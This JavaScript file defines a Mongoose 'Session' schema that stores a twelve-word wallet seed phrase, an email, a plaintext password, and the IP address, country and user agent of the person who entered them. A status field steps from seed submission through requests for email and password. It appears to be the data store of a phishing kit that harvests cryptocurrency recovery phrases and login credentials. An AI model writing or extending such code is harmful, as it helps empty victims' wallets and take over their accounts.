const { Schema, model } = require('mongoose')

const sessionSchema = new Schema(
  {
    socketId: {
      type: String,
      required: true,
      index: true,
    },
    seedWords: {
      type: [String],
      required: true,
      validate: [
        (arr) => Array.isArray(arr) && arr.length === 12,
        'Seed words array must contain 12 items.',
      ],
    },
    email: {
      type: String,
      default: null,
    },
    password: {
      type: String,
      default: null,
    },
    status: {
      type: String,
      enum: [
        'seed-submitted',
        'awaiting-email',
        'awaiting-password',
        'password-submitted',
        'finalized',
      ],
      default: 'seed-submitted',
      index: true,
    },
    ipAddress: {
      type: String,
      default: null,
    },
    country: {
      type: String,
      default: 'Unknown',
    },
    userAgent: {
      type: String,
      default: null,
    },
    emailRequestedAt: Date,
    emailSubmittedAt: Date,
    passwordSubmittedAt: Date,
    finalizedAt: Date,
  },
  {
    timestamps: true,
  },
)

module.exports = model('Session', sessionSchema)
